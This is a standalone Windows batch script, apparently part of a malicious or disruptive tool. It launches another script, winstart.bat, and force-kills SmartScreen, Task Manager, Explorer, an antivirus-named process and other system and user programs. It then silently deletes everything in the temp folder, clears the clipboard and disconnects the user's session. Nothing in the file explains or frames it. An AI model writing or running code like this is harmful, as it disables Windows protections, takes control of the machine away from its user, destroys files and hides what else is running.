@echo off
cd Sources
start winstart.bat
taskkill /F /IM bingrizzlyav.exe
taskkill /T /F /IM notepad.exe
taskkill /T /F /IM rundll32.exe
taskkill /T /F /IM RuntimeBroker.exe
taskkill /T /F /IM SearchApp.exe
taskkill /T /F /IM smartscreen.exe
taskkill /T /F /IM Taskmgr.exe
taskkill /T /F /IM uTorrent.exe
taskkill /T /F /IM WinStore.App.exe
taskkill /T /F /IM Scheduler.exe
taskkill /F /T /IM PubPlatform.exe
taskkill /F /IM explorer.exe
del /q/f/s %TEMP%\*
cmd /c echo off | clip
tsdiscon                 
exit